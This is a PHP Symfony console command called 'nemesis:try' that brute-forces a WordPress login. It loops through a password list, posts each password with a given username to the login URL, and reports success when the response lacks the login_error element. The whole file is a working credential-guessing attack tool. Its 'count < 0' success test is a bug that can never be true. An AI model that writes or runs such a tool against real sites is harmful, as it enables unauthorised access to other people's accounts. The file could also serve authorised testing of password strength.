<?php

namespace Nemesis\Command;

use Symfony\Component\Console\Command\Command;
use Symfony\Component\Console\Input\InputArgument;
use Symfony\Component\Console\Input\InputInterface;
use Symfony\Component\Console\Input\InputOption;
use Symfony\Component\Console\Output\OutputInterface;
use Nemesis\Helpers\Logger;


class TryCommand extends Command {

	protected function configure()
  	{
	    $this
          ->setName('nemesis:try')
          ->setDescription('try to login')
		  ->addArgument(
			  'url',
			  InputArgument::REQUIRED,
			  'Login Request Url'
			  )->addArgument(
			  'username',
			  InputArgument::REQUIRED,
			  'Username'
			  )
			->addArgument(
				'pwlist',
				InputArgument::OPTIONAL,
				'The PW List'
			)
			
		;
  	}

  	protected function execute(InputInterface $input, OutputInterface $output)
  	{
		$logger = new Logger($output);
		$dom = new \DOMDocument();

        $url = $input->getArgument('url');
        $user = $input->getArgument('username');


		//Read PW List
		$inpFileName = $input->getArgument('pwlist');
		if (!$inpFileName) {
			$inpFileName = __DIR__ . '/../../../test/passwords.txt';
		}

		$logger->info('Reading ' . $inpFileName);
		$handle = fopen($inpFileName, "r");
		$contents = fread($handle, filesize($inpFileName));
		fclose($handle);

		$passwords = explode(PHP_EOL, $contents);


		//Prepare Request

		// Get cURL resource
		$curl = curl_init();
		// Set some options - we are passing in a useragent too here

		//HARDCODED wordpress example
		curl_setopt_array($curl, array(
			CURLOPT_RETURNTRANSFER => 1,
			CURLOPT_URL => $url,
			CURLOPT_USERAGENT => 'Codular Sample cURL Request',
			CURLOPT_POST => 1,
			CURLOPT_POSTFIELDS => array(
				'wp-submit' => 'Anmelden',
				'log' => 'value',
				'pwd' => 'value2'
			)
		));


		$logger->info('Send Request to ' . $url . ' using user/pw ...');


		foreach($passwords as $password) {

			curl_setopt($curl, CURLOPT_POSTFIELDS, array(
				'wp-submit' => 'Anmelden',
				'log' => $user,
				'pwd' => $password
			));

			$logger->info("$user/$password");



			// Send the request & save response to $resp
			$resp = curl_exec($curl);

			if (empty($resp)) {
				$logger->info("->Login succeeded!!!! ($user/$password)");
				break;
				//var_dump(trim($element->nodeValue));
			}



			//$logger->debug("Analyze Response from Server");


			$dom->loadHTML($resp);
			$xpath = new \DOMXPath($dom);

			//HARDCODED wordpress example
			$elements = $xpath->query("/html/body/div/div[@id='login_error']");


			if (count($elements) < 0) {
				$logger->info("->Login succeeded!!!! ($user/$password)");
				break;
				//var_dump(trim($element->nodeValue));
			}

		}

		// Close request to clear up some resources
		curl_close($curl);


		$logger->info('Done');


	}
}

?>
